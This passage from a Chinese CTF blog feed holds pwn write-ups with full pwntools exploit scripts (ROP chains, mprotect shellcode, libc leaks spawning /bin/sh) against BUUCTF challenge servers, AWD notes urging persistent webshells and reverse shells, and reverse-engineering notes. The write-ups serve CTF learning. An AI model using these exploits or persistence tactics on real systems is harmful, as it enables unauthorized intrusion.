+p32 (argu3)这里的mprotect_addr就是我们要跳转到mprotect函数的地址ret_addr 为 mprotect函数执行完后的地址.argu1 为mprotect函数的第一个参数 (被修改内存的地址) 设置为 0x0x80EB000 (edb-debuger查看得到)argu2 为mprotect函数的第二个参数 (被修改内存的大小) 设置为 0x1000 (0x1000通过程序启动时查看该内存块的大小的到的)argu3 为mprotect函数的第三个参数 (被修改内存的权限) 设置为 7 = 4 + 2 +1 (rwx)为了后续再能使用栈ret,我们的构造一下栈的布局,因为mprotect函数使用到了3个参数,我们就找存在3个连续pop的指令为啥要找3个pop,也就是在正常情况下,函数传参是使用push，所以要为了堆栈还原,函数调用结束时就使用pop来保证堆栈完好.使用 ROPgadget --binary get_started_3dsctf_2016 --only &#39;pop|ret&#39; | grep pop存在pop的一些指令地址,可以发现:0x0804f460 : pop ebx ; pop esi ; pop ebp ; ret那我们就得到了该地址.上面的ret_addr就填写0x0804f460好下面我们就要构思如何将自己的shellcode写入内存再执行,使用read函数写入.read函数原型:ssize_t read(int fd, void *buf, size_t count);fd 设为0时就可以从输入端读取内容buf 设为我们想要执行的内存地址size 适当大小就可以...................</code></pre><h4 id="最终exp如下"><a href="#最终exp如下" class="headerlink" title="最终exp如下:"></a>最终exp如下:</h4><pre><code># _*_ coding:utf-8 _*_from pwn import *elf = ELF(&#39;./get_started_3dsctf_2016&#39;)sh = elf.process()sh = remote(&#39;node3.buuoj.cn&#39;, 28576)pop3_ret = 0x804951D&#39;&#39;&#39;pop esipop edipop ebp&#39;&#39;&#39;esi = 0x80EB000 #可读可写的内存,但不可执行edi = 0x1000    #通过调试出来的值ebp = 0x7       #可代表可读可写可执行mprotect_addr = elf.symbols[&#39;mprotect&#39;]read_addr = elf.symbols[&#39;read&#39;]&#39;&#39;&#39;为了连续在堆栈中执行,就是用pop3_ret来控制esp,使它往下弹掉已用的3个值.&#39;&#39;&#39;payload_01 = &#39;A&#39; * 0x38payload_01 += p32(mprotect_addr)payload_01 += p32(pop3_ret) #执行完mprotect的返回地址,使esp往下+12#mprotect 的三个参数payload_01 += p32(esi)   #mprotect函数参数1 修改的内存地址payload_01 += p32(edi)   #mprotect函数参数2 修改的内存大小payload_01 += p32(ebp)   #mprotect函数参数3 修改的权限payload_01 += p32(read_addr) #执行完pop3_ret后弹到read地址payload_01 += p32(pop3_ret)  #执行完read后将返回到pop3_ret指令,又继续使esp+12#read 的三个参数payload_01 += p32(0)     #read函数参数1 ,从输入端读取payload_01 += p32(esi)   #读取到的内容复制到指向的内存里payload_01 += p32(0x100) #读取大小payload_01 += p32(esi)   #执行完read后ret esish.sendline(payload_01)payload_sh = asm(shellcraft.sh(),arch = &#39;i386&#39;, os = &#39;linux&#39;) sh.sendline(payload_sh)sh.interactive()</code></pre><p><a href="http://www.bubuko.com/infodetail-3355135.html" target="_blank" rel="noopener">get_started_3dsctf_2016-Pwn</a></p><p>标签：<a href="http://www.bubuko.com/so/1/active" target="_blank" rel="noopener">active</a>  <a href="http://www.bubuko.com/so/1/bin" target="_blank" rel="noopener">bin</a>  <a href="http://www.bubuko.com/so/1/lag" target="_blank" rel="noopener">lag</a>  <a href="http://www.bubuko.com/so/1/大小" target="_blank" rel="noopener">大小</a>  <a href="http://www.bubuko.com/so/1/art" target="_blank" rel="noopener">art</a>  <a href="http://www.bubuko.com/so/1/ger" target="_blank" rel="noopener">ger</a>  </p><p>原文：<a href="https://www.cnblogs.com/lyxf/p/12113401.html" target="_blank" rel="noopener">https://www.cnblogs.com/lyxf/p/12113401.html</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>buu-ciscn_2019-c_1 WP</title>
    <link href="/2020/01/13/buu-ciscn_2019-c_1%20WP/"/>
    <url>/2020/01/13/buu-ciscn_2019-c_1%20WP/</url>
    
    <content type="html"><![CDATA[<h1 id="buu-ciscn-2019-c-1-WP"><a href="#buu-ciscn-2019-c-1-WP" class="headerlink" title="buu-ciscn_2019-c_1 WP"></a>buu-ciscn_2019-c_1 WP</h1><pre><code class="c">// local variable allocation has failed, the output may be wrong!int __cdecl main(int argc, const char **argv, const char **envp){  int v4; // [rsp+Ch] [rbp-4h]  init(*(_QWORD *)&amp;argc, argv, envp);  puts(&quot;EEEEEEE                            hh      iii                &quot;);  puts(&quot;EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  &quot;);  puts(&quot;EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e &quot;);  puts(&quot;EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  &quot;);  puts(&quot;EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee &quot;);  puts(&quot;====================================================================&quot;);  puts(&quot;Welcome to this Encryption machine\n&quot;);  begin();  while ( 1 )  {    while ( 1 )    {      fflush(0LL);      v4 = 0;      __isoc99_scanf(&quot;%d&quot;, &amp;v4);      getchar();      if ( v4 != 2 )        break;      puts(&quot;I think you can do it by yourself&quot;);      begin();    }    if ( v4 == 3 )    {      puts(&quot;Bye!&quot;);      return 0;    }    if ( v4 != 1 )      break;    encrypt();    begin();  }  puts(&quot;Something Wrong!&quot;);  return 0;}int begin(){  puts(&quot;====================================================================&quot;);  puts(&quot;1.Encrypt&quot;);  puts(&quot;2.Decrypt&quot;);  puts(&quot;3.Exit&quot;);  return puts(&quot;Input your choice!&quot;);}int encrypt(){  size_t v0; // rbx  char s[48]; // [rsp+0h] [rbp-50h]  __int16 v3; // [rsp+30h] [rbp-20h]  memset(s, 0, sizeof(s));  v3 = 0;  puts(&quot;Input your Plaintext to be encrypted&quot;);  gets(s);  while ( 1 )  {    v0 = (unsigned int)x;    if ( v0 &gt;= strlen(s) )      break;    if ( s[x] &lt;= 96 || s[x] &gt; 122 )    {      if ( s[x] &lt;= 64 || s[x] &gt; 90 )      {        if ( s[x] &gt; 47 &amp;&amp; s[x] &lt;= 57 )          s[x] ^= 0xFu;      }      else      {        s[x] ^= 0xEu;      }    }    else    {      s[x] ^= 0xDu;    }    ++x;  }  puts(&quot;Ciphertext&quot;);  return puts(s);}</code></pre><p>发现gets(s);这样就好办了，随后那个加密就不用管了。</p><p>看看程序里边有无system(“\bin\sh”)</p><p>![image-20191215140307281](buu-ciscn_2019-c_1 WP.assets/image-20191215140307281.png)</p><p>没有，那就只能通过libc来计算了</p><p>我们知道了lib，有了puts函数，所以我们可以leak libc的起始地址，计算libc地址，此时system和binsh都是嵌入到了内存当中的，所以我们就加上偏移即可调用</p><p>exp</p><pre><code class="python">from pwn import *context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;sh = process(&quot;./ciscn_2019_c_1&quot;)#sh = remote(&quot;node3.buuoj.cn&quot;,25817)elf = ELF(&quot;./ciscn_2019_c_1&quot;)lib = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;) #ida里可以看见sh.recvuntil(&quot;!&quot;)sh.sendline(&quot;1&quot;)sh.recvuntil(&quot;ted&quot;)offset = 87 #ida双击gets(s)看得是0x50，加上前面的\x00就是80+8pop_rdi_ret = elf.search(asm(&quot;pop rdi\nret\n&quot;)).next()payload = &#39;\x00&#39; + offset * &quot;a&quot;payload += p64(pop_rdi_ret)payload += p64(elf.got[&#39;__libc_start_main&#39;])payload += p64(elf.plt[&#39;puts&#39;])payload += p64(0x400B28) #程序起始地址sh.sendline(payload)sh.recvuntil(&quot;Ciphertext&quot;)__libc_start_main = u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&#39;\x00&#39;))libc = __libc_start_main - lib.symbols[&#39;__libc_start_main&#39;]system = libc + lib.symbols[&#39;system&#39;]binsh = libc + lib.search(&quot;/bin/sh\x00&quot;).next()sh.recvuntil(&quot;!&quot;)sh.sendline(&quot;1&quot;)payload = &#39;\x00&#39; + offset * &quot;a&quot;payload += p64(pop_rdi_ret)payload += p64(binsh)payload += p64(system + 0x1b )payload += p64(0xdeadbeef)sh.sendline(payload)log.success(&quot;__libc_start_main: &quot; + hex(__libc_start_main))sh.interactive()</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>AWD准备</title>
    <link href="/2020/01/13/AWD%E5%87%86%E5%A4%87/"/>
    <url>/2020/01/13/AWD%E5%87%86%E5%A4%87/</url>
    
    <content type="html"><![CDATA[<h1 id="AWD"><a href="#AWD" class="headerlink" title="AWD"></a>AWD</h1><h2 id="探测主机"><a href="#探测主机" class="headerlink" title="探测主机"></a>探测主机</h2><p>Nmap或HTTPScan</p><p>Nmap扫描端口</p><h2 id="端口攻击"><a href="#端口攻击" class="headerlink" title="端口攻击"></a>端口攻击</h2><p>常见：22，2389，1443，3306</p><p>==准备爆破脚本！！！==</p><h2 id="WEB攻击"><a href="#WEB攻击" class="headerlink" title="WEB攻击"></a>WEB攻击</h2><blockquote><p>Web 方面的语言多为 PHP，小部分为 Java 和 Python。这里的 Web 环境分两种情况，一种是已有漏洞的框架，一种是出题人写的框架。</p><p>如果是已有漏洞的框架，通常会比较明显。比如说 Struts 2 各种漏洞等等，用工具扫就可以扫出来。这个需要准备得比较充分，在电脑中备好 EXP 库、漏洞库和各种扫描工具库，以便能够快速利用比较明显的漏洞。总之手要快！</p><p>如果是出题人出的框架，常用并且简单有效的做法是把整站源码下载下来，直接用工具审计。以 PHP 举例，一般的流程是先D盾查杀，发现有带有预留后门或者 Webshell 马上报给防守队友进行加固。</p><p>把后门的问题搞定、防止别人快速拿分后，其次才是源码审计，发现问题点后迅速验证，报给防守队友，并且开始写攻击脚本。以 PHP 举例，一般是使用 Seay 等源码审计工具，审核出比较明显的漏洞。</p><p>完成了工具扫描后，开始常规的渗透测试，比如说文件上传、SQL 注入等等，看是否能绕过，找到一个点马上写利用脚本。<br>————————————————<br>版权声明：本文为CSDN博主「neversec」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/github_35912913/article/details/89336506" target="_blank" rel="noopener">https://blog.csdn.net/github_35912913/article/details/89336506</a></p></blockquote><h2 id="维持权限"><a href="#维持权限" class="headerlink" title="维持权限"></a>维持权限</h2><p>AWD优先种不死马，反弹shell</p><blockquote><p>不死马：不断在该路径生成shell，用于工具连接</p></blockquote><pre><code>find / -name *flag*grep -rn &quot;flag&quot; *</code></pre><h2 id="防守"><a href="#防守" class="headerlink" title="防守"></a>防守</h2><ul><li><p>备份源码和数据库</p></li><li><p>系统安全性检查。关闭3306！！、限制ssh登录，修改ssh密码，Mysql是否默认密码==写脚本刷!==</p></li><li><p>部署WAF@zx</p></li><li><p>修改权限。修改Mysql权限等。</p></li><li><blockquote><p>监控可读写权限的目录是否新增、删除文件并及时提醒。这里说下，如果被种了不死马的话通常有以下几种克制方法。</p><ul><li><p>强行 kill 掉进程后重启服务</p></li><li><p>建立一个和不死马相同名字的文件或者目录</p></li><li><p>写脚本不断删除文件</p></li><li><p>不断写入一个和不死马同名的文件</p></li></ul><ol start="6"><li>部署流量监控脚本或开启服务器日志记录。目的主要是为了进行流量回放，看其它大佬如何用我们没发现的漏洞来打我们的机子，抓取到之后把看不懂的流量直接回放到别的机子去，这里还得提到，我们自己在攻击的时候，也要试着混淆一下自己的攻击流量，不能轻易被别人利用。<br>————————————————<br>版权声明：本文为CSDN博主「neversec」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/github_35912913/article/details/89336506" target="_blank" rel="noopener">https://blog.csdn.net/github_35912913/article/details/89336506</a></li></ol></blockquote></li><li><p>流量监控脚本</p></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.服务器所需要的软件包，避免服务器上没有</p><p>2.EXP和漏洞库</p><p>3.加固、基线检查漏洞</p><p>4.WAF代码和部署脚本</p><p>5.批量拿shell、提交flag、维持权限的代码或小框架</p><p><strong>软件包也得看给你的服务器有无足够的权限去运行</strong></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>AWD</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>AWD常用指令</title>
    <link href="/2020/01/13/AWD%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/"/>
    <url>/2020/01/13/AWD%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="AWD常用指令"><a href="#AWD常用指令" class="headerlink" title="AWD常用指令"></a>AWD常用指令</h1><p>备份web目录</p><pre><code>tar -zcvf web.tar.gz /var/www/html/</code></pre><p>查看已建立网络连接和对应进程</p><pre><code>netstat -antulp | grep EST</code></pre><p>用户管理</p><p>w    查看当前用户</p><pre><code>pkill -kill -t &lt;Username&gt;</code></pre><p>查看指定端口被哪个进程占用</p><pre><code>lsof -i:端口号 或者 netstat -tunlp|grep 端口号</code></pre><pre><code>#备份mysql数据库mysqldump -u 用户名 -p 密码 数据库名 &gt; back.sql　　　　mysqldump --all-databases &gt; bak.sql　　　　　　#还原mysql数据库mysql -u 用户名 -p 密码 数据库名 &lt; bak.sql　　find / *.php -perm  　　 　　awk -F:  /etc/passwd　　　　crontab -l　　　</code></pre><pre><code class="#结束进程命令">#检测所有的tcp连接数量及状态netstat -ant|awk  |grep |sed -e  -e |sort|uniq -c|sort -rn#查看页面访问排名前十的IPcat /var/log/apache2/access.log | cut -f1 -d   | sort | uniq -c | sort -k  -r | head -　　#查看页面访问排名前十的URLcat /var/log/apache2/access.log | cut -f4 -d   | sort | uniq -c | sort -k  -r | head -</code></pre><pre><code>#封杀某个IP或者ip段，如：.　　iptables -I INPUT -s . -j DROPiptables -I INPUT -s ./ -j DROP#禁止从某个主机ssh远程访问登陆到本机，如123..　　iptable -t filter -A INPUT -s . -p tcp --dport  -j DROP　　</code></pre><p><strong>封杀ip一旦发现直接取消比赛资格的，转发流量也是</strong></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>AWD</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>[OGeek2019]babyrop</title>
    <link href="/2020/01/13/%5BOGeek2019%5Dbabyrop/"/>
    <url>/2020/01/13/%5BOGeek2019%5Dbabyrop/</url>
    
    <content type="html"><![CDATA[<h1 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h1><img src="2020/01/13/%5BOGeek2019%5Dbabyrop/image-20200109113815190.png" srcset="/img/loading.gif" class="" title="image-20200109113815190"><h2 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h2><img src="2020/01/13/%5BOGeek2019%5Dbabyrop/image-20200109113247829.png" srcset="/img/loading.gif" class="" title="image-20200109113247829"><img src="2020/01/13/%5BOGeek2019%5Dbabyrop/image-20200109113307666.png" srcset="/img/loading.gif" class="" title="image-20200109113307666"><p>为了绕过strncmp，我们在v6这里可以放一个\x00 因为strlen会在识别到\x00之后停止，这样strncmp就会默认返回0</p><img src="2020/01/13/%5BOGeek2019%5Dbabyrop/image-20200109113459963.png" srcset="/img/loading.gif" class="" title="image-20200109113459963"><p>这里的v5返回值又跟下面的a1是一致的</p><img src="2020/01/13/%5BOGeek2019%5Dbabyrop/image-20200109113326191.png" srcset="/img/loading.gif" class="" title="image-20200109113326191"><img src="2020/01/13/%5BOGeek2019%5Dbabyrop/image-20200109113733376.png" srcset="/img/loading.gif" class="" title="image-20200109113733376"><p>这里也没有啥可以调用的</p><p>那就是rop，leak libc了</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><h3 id="leak-libc版"><a href="#leak-libc版" class="headerlink" title="leak libc版"></a>leak libc版</h3><pre><code class="python">#!/usr/bin/python2.7# -*- coding: utf-8 -*-from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;elf = ELF(&#39;[OGeek2019]babyrop&#39;)lib = ELF(&quot;./libc-2.23.so&quot;)sh = 0def pwn(ip,port,debug):    global lib    global sh    if debug == 1:        sh = process(&#39;./[OGeek2019]babyrop&#39;)        lib = ELF(&quot;./libc-2.23.so&quot;)    else:        sh = remote(ip,port)        lib = ELF(&quot;./libc-2.23.so&quot;)    main_start = 0x8048825    write_plt = elf.plt[&#39;write&#39;]    write_got = elf.got[&#39;write&#39;]    pop_ret = 0x80488F9    libc = elf.got[&#39;__libc_start_main&#39;]    payload = &quot;\x00&quot;    payload += &quot;\xff&quot; * 7    sh.sendline(payload)    sh.recvuntil(&quot;Correct\n&quot;)    payload = cyclic(0xE7 + 0x4)    payload += p32(write_plt)    payload += p32(pop_ret)    payload += p32(1)    payload += p32(libc)    payload += p32(4)    payload += p32(main_start)    sh.sendline(payload)    __libc_start_main = u32(sh.recv(4))    libc = __libc_start_main - lib.symbols[&#39;__libc_start_main&#39;]    system = libc + lib.symbols[&#39;system&#39;]    binsh = libc + lib.search(&#39;/bin/sh\x00&#39;).next()    log.success(&quot;libc: &quot; + hex(libc))    log.success(&quot;system: &quot; + hex(system))    log.success(&quot;binsh: &quot; + hex(binsh))    payload = &quot;\x00&quot;    payload += &quot;\xff&quot; * 7    sh.sendline(payload)    sh.recvuntil(&quot;Correct\n&quot;)    payload = cyclic(0xE7 + 0x4)    payload += p32(system)    payload += p32(0xdeadbeef)    payload += p32(binsh)    sh.sendline(payload)    sh.interactive()if __name__ ==  &quot;__main__&quot;:    pwn(&quot;node3.buuoj.cn&quot;,29257,0 )</code></pre><h3 id="leak-write"><a href="#leak-write" class="headerlink" title="leak write"></a>leak write</h3><pre><code class="python">#!/usr/bin/python2.7# -*- coding: utf-8 -*-from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;elf = ELF(&#39;[OGeek2019]babyrop&#39;)lib = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)sh = 0def pwn(ip,port,debug):    global lib    global sh    if debug == 1:        sh = process(&#39;./[OGeek2019]babyrop&#39;)        lib = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)    else:        sh = remote(ip,port)        lib = ELF(&quot;./libc-2.23.so&quot;)    main_start = 0x8048825    write_plt = elf.plt[&#39;write&#39;]    write_got = elf.got[&#39;write&#39;]    pop_ret = 0x80488F9    payload = &quot;\x00&quot;    payload += &quot;\xff&quot; * 7    sh.sendline(payload)    sh.recvuntil(&quot;Correct\n&quot;)    payload = cyclic(0xE7 + 0x4)    payload += p32(write_plt)    payload += p32(pop_ret)    payload += p32(1)    payload += p32(write_got)    payload += p32(4)    payload += p32(main_start)    sh.sendline(payload)    write_addr = u32(sh.recv(4))    libc = write_addr - lib.symbols[&#39;write&#39;]    system = libc + lib.symbols[&#39;system&#39;]    binsh = libc + lib.search(&#39;/bin/sh\x00&#39;).next()    log.success(&quot;libc: &quot; + hex(libc))    log.success(&quot;system: &quot; + hex(system))    log.success(&quot;binsh: &quot; + hex(binsh))    payload = &quot;\x00&quot;    payload += &quot;\xff&quot; * 7    sh.sendline(payload)    sh.recvuntil(&quot;Correct\n&quot;)    payload = cyclic(0xE7 + 0x4)    payload += p32(system)    payload += p32(0xdeadbeef)    payload += p32(binsh)    sh.sendline(payload)    sh.interactive()if __name__ ==  &quot;__main__&quot;:    pwn(&quot;node3.buuoj.cn&quot;,29257,0)</code></pre><h2 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h2><h2 id="sprintf"><a href="#sprintf" class="headerlink" title="sprintf"></a>sprintf</h2><pre><code class="c">#include&lt;stdio.h&gt;int main(){ char a[] = {&#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;};   char b[] = {&#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;};   char buffer[10];  sprintf(buffer, &quot;%.4s%.4s&quot;, a, b);   printf(&quot;%s\n&quot;, buffer);  return 0;}</code></pre><img src="2020/01/13/%5BOGeek2019%5Dbabyrop/SouthEast.png" srcset="/img/loading.gif" class="" title="img"><p>将ab写入buffer</p><h2 id="read"><a href="#read" class="headerlink" title="read"></a>read</h2><p>ssize_t read (int fd, void *buf, size_t count);<br>read(a,buf,c)<br>打开文件a，读取c个字节，存到buf中<br>返回实际读到的字节数。如果出错 返回-1</p><p>read(0,&amp;buf,4u)</p><p>从shell读取4u到buf中</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>19/9/20笔记</title>
    <link href="/2019/11/29/19920%E7%AC%94%E8%AE%B0/"/>
    <url>/2019/11/29/19920%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="逆向笔记"><a href="#逆向笔记" class="headerlink" title="逆向笔记"></a>逆向笔记</h1><p>PE是windows下的文件，ELF是linux/unix下的文件</p><p>packer壳</p><p>28537194573619560LL LL-&gt;长长整型</p><p>可在汇编语言中寻找到mov rax ，指针 沿着指针 再按R看转换后的内容（由于低尾端，栈地址向低地址扩展，所以要将字符串反过来）</p><h2 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h2><p>b 函数名</p><blockquote><p>下断点breakpoint</p><pre><code>b __libc_start_main #在主函数设置断点</code></pre></blockquote><p>set</p><pre><code>set $eip=地址 #跳转到某函数地址set $eip=0x0804849b</code></pre><p>r</p><blockquote><p>run 运行到我们下断点的地方，停止</p></blockquote><p>n</p><blockquote><p>运行一步</p></blockquote><p>x/200wx $寄存器</p><blockquote><p>x:就是用来查看内存中数值的，后面的200代表查看多少个，wx代表是以word字节查看看，$eax代表的eax寄存器中的值</p></blockquote><h2 id="反编译pyc"><a href="#反编译pyc" class="headerlink" title="反编译pyc"></a>反编译pyc</h2><blockquote><p>uncompyle2 -h</p></blockquote><p>==md5(md5($pass)) ：第一次加密后，结果转换成小写，对结果再加密一次.解密为：解密一次后，再解密一次==</p><p><img src="19920%E7%AC%94%E8%AE%B0.assets%5Cimage-20190820013756861.png" srcset="/img/loading.gif" alt="image-20190820013756861"></p><blockquote><p>Re2-cpp-is-awesome</p></blockquote><pre><code class="cpp">if ( a1 != 2 )  {    v3 = *a2;    v4 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Usage: &quot;, a3);    v6 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(v4, v3, v5);    std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(v6, &quot; flag\n&quot;, v7);    exit(0);  }                                             // 检测输入  std::allocator&lt;char&gt;::allocator(&amp;v13, a2, a3);  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(&amp;v12, a2[1], &amp;v13);  std::allocator&lt;char&gt;::~allocator(&amp;v13);  v15 = 0;  for ( i = std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::begin(&amp;v12); ; iplusplus(&amp;i) )  {    v14 = std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::end(&amp;v12);    if ( !iNotEqualV14((__int64)&amp;i, (__int64)&amp;v14) )      break;    v9 = *(unsigned __int8 *)thesame((__int64)&amp;i);    if ( (_BYTE)v9 != originalKey[Number[v15]] )//key      betterLuckNextTime((__int64)&amp;i, (__int64)&amp;v14, v9);    ++v15;  }  coutShouldHaveFlagNow((__int64)&amp;i, (__int64)&amp;v14, v8);  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v12);  return 0LL;</code></pre><pre><code class="python">key = &#39;L3t_ME_T3ll_Y0u_S0m3th1ng_1mp0rtant_A_{FL4G}_W0nt_b3_3X4ctly_th4t_345y_t0_c4ptur3_H0wev3r_1T_w1ll_b3_C00l_1F_Y0u_g0t_1t&#39;dump = [0x24,0x00,0x05,0x36,0x65,0x07,0x27,0x26,0x2D,0x01,0x03,0x00,0x0D,0x56,0x01,0x03,0x65,0x03,0x2D,0x16,0x02,0x15,0x03,0x65,0x00,0x29,0x44,0x44,0x01,0x44,0x2B]flag = &#39;&#39;for i in dump:    flag +=key[i]print(flag)</code></pre><p><img src="19920%E7%AC%94%E8%AE%B0.assets%5Cimage-20190820143248918.png" srcset="/img/loading.gif" alt="image-20190820143248918"></p><p>记得全都要写下来，包括0</p><hr><p><img src="19920%E7%AC%94%E8%AE%B0.assets%5Cimage-20190821163335042.png" srcset="/img/loading.gif" alt="image-20190821163335042"></p><p>不止可能是保存，还有可能读取文本中的字符串与程序里的对比</p><hr><p>IDA </p><p>快捷键Y 输入 char a[0x大小] 就可以自动转成字符串</p><p>汇编的条件跳转指令:</p><p>​      jmp :无条件跳转 (jump)</p><p>​      je/jz :结果为0跳转 (jump zero)</p><p>​      jnz/jne: 结果不为0跳转 (jump not zero)</p><p>​      js:结果为负跳转 (Jump if sign)</p><p>​      jns:结果为正跳转(Jump if not sign)</p><p>​      jb:小于则跳转（Jump below）</p><p>​     jnb:大于或等于则跳转(Jump not below)</p><p><a href="https://www.jianshu.com/p/dc3f6437c108" target="_blank" rel="noopener">运用Z来使得程序按照自己想法执行</a></p><p><img src="19920%E7%AC%94%E8%AE%B0.assets%5Cimage-20190830134741936.png" srcset="/img/loading.gif" alt="image-20190830134741936"></p><hr><h3 id="大小端！！！！！！"><a href="#大小端！！！！！！" class="headerlink" title="大小端！！！！！！"></a>大小端！！！！！！</h3><p><img src="19920%E7%AC%94%E8%AE%B0.assets%5Cimage-20190822204713754.png" srcset="/img/loading.gif" alt="image-20190822204713754"></p><p>mercedes!!!!</p><hr><p><img src="19920%E7%AC%94%E8%AE%B0.assets%5Cimage-20190826101318562.png" srcset="/img/loading.gif" alt="image-20190826101318562"></p><p>搜索字符串</p><p><img src="19920%E7%AC%94%E8%AE%B0.assets%5Cimage-20190826101343642.png" srcset="/img/loading.gif" alt="image-20190826101343642"></p><p>双击flag可找到使用地址</p><p>继续双击DATA XREF后面的信息可跳转到命令起始地址</p><hr><p>链表<a href="https://www.jianshu.com/p/7779f3e83384" target="_blank" rel="noopener">https://www.jianshu.com/p/7779f3e83384</a></p><p><a href="https://www.cnblogs.com/ha2ha2/p/7943339.html" target="_blank" rel="noopener">https://www.cnblogs.com/ha2ha2/p/7943339.html</a></p><hr><p>ext3</p><pre><code>mount filename /mnt/cd /mnt/find | grep &#39;flag&#39;</code></pre><hr><p>kali</p><pre><code>pdftotext filename.pdf 1.txt</code></pre><hr><h2 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h2><p>用chrome打开pdf 复制所有字符 A.B-</p><p>逐帧查看，或者使用stegslove</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>What a day</title>
    <link href="/2019/11/19/What%20a%20day/"/>
    <url>/2019/11/19/What%20a%20day/</url>
    
    <content type="html"><![CDATA[<p>明明说要调整作息的，结果头疼晚上睡了会，现在一点都不困了。。。。</p><h2 id="想学逆向"><a href="#想学逆向" class="headerlink" title="想学逆向"></a>想学逆向</h2><p>发现了mac上的一些软件之类的，<a href="https://www.jianshu.com/p/c04ac36c6641?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">link</a></p><p>入门<a href="https://blog.csdn.net/qq_21508727/article/details/80559270" target="_blank" rel="noopener">link</a></p><p>pwn学习流程<br>– [ ] 小甲鱼视频<br>– [ ] liveoverflow那一套视频入门<br>– [ ] Ctfwiki，每种类型例题跟着做一遍，realworld就漏洞战争，google project zero博客之类的<br>– [ ] 栈简单汇编就行，堆要去看linux源码,Malloc和free部分,常见的dlmalloc和ptmalloc,还有fastbins，glibc2.26之后是trachebins，所以还要看不同版本的源码</p><h2 id="在线ctf平台"><a href="#在线ctf平台" class="headerlink" title="在线ctf平台"></a>在线ctf平台</h2><p><a href="https://i.loli.net/2019/08/06/Jht7r9DY4xadcQZ.png" target="_blank" rel="noopener">![ctf平台](What a day.assets/Jht7r9DY4xadcQZ.png)</a></p><p>下那么多游戏就为了一起玩嘛。。。这样吧，等战雷会员过期了就删了吧。嗯</p><h1 id="GOGOGO！"><a href="#GOGOGO！" class="headerlink" title="GOGOGO！"></a>GOGOGO！</h1><h1 id="过几天重新开始一大早起床跑步吧"><a href="#过几天重新开始一大早起床跑步吧" class="headerlink" title="过几天重新开始一大早起床跑步吧!"></a>过几天重新开始一大早起床跑步吧!</h1>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>转载-编写shellcode测试工具</title>
    <link href="/2019/11/19/%E7%BC%96%E5%86%99shellcode%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/"/>
    <url>/2019/11/19/%E7%BC%96%E5%86%99shellcode%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/</url>
    
